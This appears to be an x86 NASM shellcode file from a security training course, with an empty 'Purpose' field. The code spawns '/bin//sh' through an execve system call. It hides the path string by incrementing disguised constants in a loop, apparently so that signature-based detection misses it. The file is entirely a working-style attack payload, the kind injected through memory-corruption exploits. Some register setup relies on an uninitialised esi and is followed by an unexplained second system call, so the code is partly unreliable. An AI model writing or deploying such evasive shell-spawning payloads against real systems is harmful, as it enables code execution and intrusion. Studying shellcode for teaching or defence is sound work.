; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:
    xor ecx, ecx
    mul ecx ; this one instruction sets both eax and edx to 0, this is because mul
    push eax
    mov cl, 16
    mov edi, 0x68732f1f
    mov edx, 0x6e69621f
a:
    inc edi
    inc edx
    loop a
    push edi
    push edx

    mov ebx, esp
    mov ecx, esi
    mov edx, esi
    mov al, 0xb
    int 0x80
    inc esi
    int 0x80

